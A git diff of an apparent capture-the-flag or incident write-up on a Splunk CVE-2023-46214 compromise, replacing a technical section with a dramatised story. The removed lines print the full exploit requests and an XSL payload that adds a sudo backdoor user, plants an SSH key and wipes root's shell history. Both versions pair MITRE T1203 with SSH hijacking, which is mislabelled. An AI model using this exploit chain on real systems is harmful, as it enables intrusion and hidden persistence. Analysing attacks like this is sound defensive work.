@@ -102,149 +102,298 @@ _Her fingers hover over her keyboard like a pianist about to begin a symphony of
 
 ---
 
-> _To be continued..._
-
-## The Network Capture Investigation
-
-The team provided to mona a `.cap` file containing 1,427 packets.
-
-Mona was using a network traffic tools wireshark he began by filtering for HTTP/HTTPS traffic to identify any abnormal activity on the network then he find out something wierd during the connection to the Splunk web UI. After applying the HTTP filter, he narrowed the traffic down to 30 packets out of the total 1,427, focusing the analysis on these to look for potential security anomalies or unauthorized access patterns. sudden he find some thing wierd that may be related to the splunk CVE-2023-46214
+## Episode 2: Digital Breadcrumbs
 
 ---
 
-## Exploiting Splunk Remote Code Execution (RCE) Vulnerability
+### Scene 1: The Analysis Begins
 
-By analyzing the HTTP request, a `POST` method stands out, which is associated with a critical Remote Code Execution (RCE) vulnerability in Splunk CVE-2023-46214. For more information, check out [Uptycs Blog](https://www.uptycs.com/blog/threat-research-report-team/splunk-vulnerability-cve-2023-46214).
+_The SOC room has transformed into Mona's temporary command center. Multiple monitors surround her, each reflecting the blue glow of packet analysis tools._
 
-```bash
-POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1
-Host: ubuntu:8000
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
-Accept-Encoding: gzip, deflate, br
-Accept: text/javascript, text/html, application/xml, text/xml, */*
-Connection: keep-alive
-X-Requested-With: XMLHttpRequest
-X-Splunk-Form-Key: 7329280097253260706
-Cookie: splunkd_8000=Qwwd^Wsu1LKIQ1wyhHD39Xh1hhVVVKhcBpjhRad2F4izvjbE9MV658229L3Y_DiEzPgBw5f^ZzybEUBBnOgjDZNxniMCUm4YdpAeQ2mnRgzNuA8JJ5qHZUsjDcOrrmiYnRaCnqY; splunkweb_csrf_token_8000=7329280097253260706; session_id_8000=df3ea150f1987e9303605bbaa9a30fae85cc6fbe
-Content-Length: 1559
-Content-Type: multipart/form-data; boundary=701f565ce8c744fcd96cd368909b966e
-
-
-Content-Disposition: form-data; name="spl-file"; filename="search.xsl"
-Content-Type: application/xslt+xml
-
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
-  <xsl:template match="/">
-    <exsl:document href="/opt/splunk/bin/scripts/search.sh" method="text">
-        <xsl:text>#!/bin/bash&#10;adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx&#10;access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)&#10;echo &quot;nginx:$access&quot; | chpasswd&#10;usermod -aG sudo nginx&#10;mkdir /var/www/.ssh&#10;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org&quot; &gt; /var/www/.ssh/authorized_keys&#10;chown -R nginx:nginx /var/www/&#10;cat /dev/null &gt; /root/.bash_history</xsl:text>
-    </exsl:document>
-  </xsl:template>
-</xsl:stylesheet>
 ```
-
-### Step-by-Step Exploitation Process
-
-#### Step 1: Login
-
-The exploitation process begins with sending a login HTTP `POST` request. The attacker requires user credentials to proceed.
-
-```bash
-POST /en-US/account/login HTTP/1.1
-Host: ubuntu:8000
-User-Agent: python-requests/2.31.0
-Accept-Encoding: gzip, deflate, br
-Accept: */*
-Connection: keep-alive
-Content-Length: 78
-Content-Type: application/x-www-form-urlencoded
-
-username=johnnyC&password=h3Re15j0hnNy&set_has_logged_in=false
+[Network Capture Stats]
+Total Packets: 1,427
+Time Range: 22:45:16 - 23:47:32
+Capture Size: 2.3 MB
 ```
-
-#### Step 2: Upload Malicious XSL File
-
-After login, the attacker uploads a malicious XSL file, the main payload for this exploit:
-
-```bash
-POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1
-Host: ubuntu:8000
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
-Accept-Encoding: gzip, deflate, br
-Accept: application/xml, */*
-Connection: keep-alive
-X-Splunk-Form-Key: 7329280097253260706
-Cookie: splunkd_8000=Qwwd^Wsu1LKIQ1wyhHD39Xh1hhVVVKhcBpjhRad2F4izvjbE9MV658229L3Y_DiEzPgBw5f^ZzybEUBBnOgjDZNxniMCUm4YdpAeQ2mnRgzNuA8JJ5qHZUsjDcOrrmiYnRaCnqY; splunkweb_csrf_token_8000=7329280097253260706
-Content-Length: 1559
-Content-Type: multipart/form-data; boundary=701f565ce8c744fcd96cd368909b966e
-
-Content-Disposition: form-data; name="spl-file"; filename="search.xsl"
-Content-Type: application/xslt+xml
-```
-
-#### Step 3: Malicious Code in XSL File
-
-The XSL file uploads a payload with the following commands:
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
-  <xsl:template match="/">
-    <exsl:document href="/opt/splunk/bin/scripts/search.sh" method="text">
-        <xsl:text>#!/bin/bash
-adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx
-access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
-echo "nginx:$access" | chpasswd
-usermod -aG sudo nginx
-mkdir /var/www/.ssh
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.org" > /var/www/.ssh/authorized_keys
-chown -R nginx:nginx /var/www/
-cat /dev/null > /root/.bash_history</xsl:text>
-    </exsl:document>
-  </xsl:template>
-</xsl:stylesheet>
-```
-
-#### Explanation of the Malicious Code
-
-- **Add User**: Adds a new user named `nginx` with a home directory of `/var/www/`.
-- **Set Password**: Decodes and reverses a base64 password.
-  ```bash
-  access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
-  ```
-  **Decoded Password**: `f8287ec2-3f9a-4a39-9076-36546ebb6a93`
-- **Set SSH Access**: Adds an RSA public key to allow SSH access for the `nginx` user.
-
-#### Step 4: Trigger Code Execution
-
-Once the malicious XSL file is uploaded, the vulnerable code path is accessed using the `getJobAsset` function by calling the job search endpoint with the dispatch ID:
-
-```bash
-POST /en-US/splunkd/__raw/servicesNS/johnnyC/search/search/jobs?output_mode=json HTTP/1.1
-```
-
-This ultimately allows the attacker to execute arbitrary code and escalate privileges.
 
 ---
 
-## This vulnerability has the relevant MITRE ATT&CK Techniques for Maintaining Persistence
+### Scene 2: The Hunt
 
-### 1. **Create Account (T1136)**
+_Mona's fingers dance across her mechanical keyboard, the clicking sounds rhythmic and purposeful._
 
-- **Description**: This technique involves an attacker creating a new user account on a compromised system.
-- **Example**: An attacker could exploit the vulnerability to create a new account with administrative privileges, granting them ongoing access. This is often achieved via commands that add users with elevated permissions.
+**Mona** [muttering to herself]:  
+"Let's see what stories these packets can tell..."
 
-### 2. **SSH Hijacking (T1203)**
+_She types her first filter command:_
 
-- **Description**: By adding an SSH public key to the authorized keys of an existing or newly created user, an attacker can enable remote access without needing a password.
-- **Example**: An attacker may inject a script to add their SSH key to a user’s `.ssh/authorized_keys` file, allowing them to maintain remote access independently of the original method of entry.
-
-### 3. **Account Manipulation (T1098)**
-
-- **Description**: This technique involves modifying account permissions or configurations to retain access.
-- **Example**: An attacker might modify an existing account by adding it to the `sudo` group or altering password settings to ensure persistent access.
+```wireshark
+http || https
+```
 
 ---
+
+### Scene 3: The Discovery
+
+_The screen refreshes, packets reorganizing themselves like digital playing cards._
+
+**John** [watching over her shoulder]:  
+"Thirty packets... out of more than fourteen hundred?"
+
+**Mona**:  
+"Sometimes the smallest anomalies tell the biggest stories."
+
+---
+
+### Scene 4: The Splunk Connection
+
+_Mona leans forward, her eyes narrowing at a particular sequence of packets._
+
+```
+[Packet Analysis]
+Time: 23:15:47
+Source: 192.168.1.105
+Destination: 10.0.0.15:8000
+Protocol: HTTP
+```
+
+**Mona** [to herself]:  
+"The Splunk web UI connection... something's not right here."
+
+---
+
+### Scene 5: The Pattern
+
+_Multiple screens show different aspects of the same traffic pattern. Mona's face is illuminated by the data scrolling past._
+
+**Marcos**:  
+"What are you seeing?"
+
+**Mona** [highlighting sections of the capture]:  
+"These request patterns... they're identical to..."
+_Her voice trails off as she furiously types._
+
+---
+
+### Scene 6: The Revelation
+
+```
+[CRITICAL FINDING]
+CVE ID: CVE-2023-46214
+Status: CONFIRMED
+Severity: CRITICAL
+Vector: Splunk Web UI
+```
+
+_The room falls silent as the implications sink in._
+
+**Mona** [grimly]:  
+"This exploit allows attackers to execute arbitrary commands through the Splunk web interface. Someone knew exactly what they were doing."
+
+---
+
+### Scene 7: The Evidence
+
+_Mona pulls up multiple windows, creating a timeline of the attack:_
+
+```
+23:15:47 - Initial connection to Splunk UI
+23:15:52 - Malformed request detected
+23:16:03 - Unusual response size
+23:16:15 - Command injection signature
+23:16:30 - File system access attempt
+```
+
+**Thomas** [pointing at the screen]:  
+"That's exactly when my security alerts started firing!"
+
+---
+
+### Scene 8: The Confirmation
+
+_Mona swivels in her chair to face the team._
+
+**Mona**:  
+"We're dealing with someone who knows their CVEs. They exploited a vulnerability that was just published. But they made one mistake..."
+
+_She turns back to her screen, a slight smile playing at the corner of her mouth._
+
+**Mona**:  
+"They left breadcrumbs."
+
+---
+
+### Scene 9: The Next Step
+
+_The team clusters around Mona's workspace, the tension palpable._
+
+**Marcos**:  
+"What do we do now?"
+
+**Mona** [reaching for her custom USB drive]:  
+"Now? We follow the trail. And I know exactly where it leads..."
+
+---
+
+_Technical Notes:_
+
+- CVE-2023-46214 refers to a critical vulnerability in Splunk Enterprise
+- The attack pattern shows sophisticated knowledge of Splunk's web interface
+- Network capture analysis reveals precise timing of the initial breach
+
+---
+
+# GETI City Cyber Crisis
+
+## Episode 3: The Exploit Chain
+
+---
+
+### Scene 1: The Deep Dive
+
+_Mona's workspace is illuminated by multiple screens, each showing different aspects of the attack. The room is dark except for the blue glow of monitors._
+
+**Mona** [eyes fixed on the central screen]:  
+"There you are... I can see your footprints now."
+
+---
+
+### Scene 2: The HTTP Dance
+
+_A terminal window shows scrolling HTTP requests. Mona's fingers tap rhythmically on her desk._
+
+```
+[NETWORK TIMELINE]
+23:15:47 - POST /en-US/account/login
+23:15:52 - Authentication successful
+23:16:03 - POST /en-US/splunkd/__upload
+```
+
+**John** [leaning in]:  
+"What are we looking at?"
+
+**Mona**:  
+"The attacker's opening moves. Like a chess game, every piece has its purpose."
+
+---
+
+### Scene 3: The Revelation
+
+_Mona pulls up a split screen showing the malicious payload._
+
+**Mona**:  
+"Look at this. They used an XSL file as their weapon of choice. Elegant... and deadly."
+
+```
+[MALICIOUS PAYLOAD DETECTED]
+Type: XSL Transform
+Target: Splunk Enterprise
+Severity: Critical
+Intent: Remote Code Execution
+```
+
+---
+
+### Scene 4: Breaking It Down
+
+_The team gathers around as Mona dissects the attack._
+
+**Mona** [pointing at different sections of code]:  
+"Three-step attack chain:
+
+1. Login with stolen credentials
+2. Upload weaponized XSL file
+3. Trigger the payload"
+
+**Marcos**:  
+"But what was their endgame?"
+
+---
+
+### Scene 5: The Master Plan
+
+_Mona's screen fills with decoded commands._
+
+**Mona** [grimly]:  
+"They weren't just breaking in... they were moving in."
+
+_She highlights key portions of the decoded payload:_
+
+```
+[ATTACKER'S ACTIONS]
+✓ Create backdoor user
+✓ Grant admin privileges
+✓ Plant SSH key
+✓ Cover tracks
+```
+
+---
+
+### Scene 6: The Pieces Fall Into Place
+
+_Thomas jumps from his chair, recognition dawning on his face._
+
+**Thomas**:  
+"The new account I spotted... it wasn't random!"
+
+**Mona** [nodding]:  
+"They created a ghost in our machine. A user named 'nginx' hidden in plain sight."
+
+---
+
+### Scene 7: The Tradecraft
+
+_Mona brings up a tactical analysis screen._
+
+**Mona**:  
+"This is professional work. They're using techniques straight from the MITRE ATT&CK framework:
+
+- Account Creation
+- SSH Hijacking
+- Privilege Escalation"
+
+---
+
+### Scene 8: The Smoking Gun
+
+_A decoded base64 string appears on screen._
+
+**Mona** [triumphant]:  
+"And here's their mistake. The password they used..."
+
+_She runs a quick decode command:_
+
+```
+f8287ec2-3f9a-4a39-9076-36546ebb6a93
+```
+
+**Mona**:  
+"This isn't random. It's a signature."
+
+---
+
+### Scene 9: The Trail Heats Up
+
+_The team looks at each other as the implications sink in._
+
+**Marcos**:  
+"You know who did this?"
+
+**Mona** [closing her laptop]:  
+"Better. I know where they're going next. And this time..."
+_She pulls out a small device from her coat pocket_
+"...we'll be waiting for them."
+
+---
+
+_Technical Notes:_
+
+- Exploit: CVE-2023-46214 (Splunk Enterprise RCE)
+- Attack Chain: Authentication → Upload → Code Execution
+- Persistence Mechanisms: Account Creation, SSH Key Installation
+- MITRE Techniques: T1136, T1203, T1098
+-
 
 ## Investigation on Server Artefacts
 
